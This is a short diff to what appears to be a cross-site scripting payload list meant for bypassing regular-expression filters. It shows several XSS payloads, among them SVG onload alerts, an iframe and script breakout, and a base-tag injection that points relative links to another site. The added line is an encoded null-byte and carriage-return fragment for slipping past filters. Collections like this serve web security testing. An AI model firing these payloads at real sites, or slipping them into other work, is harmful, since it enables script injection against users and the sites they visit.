@@ -12,3 +12,4 @@ an XSS payload with Alert Obfuscation, for bypass RegEx filters
 <svg/onload=alert(/stored-xss/.source)>\r\n
 ?cId="></iframe><svg/onload=alert(1)>
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
+<%00iframe , on%0derror
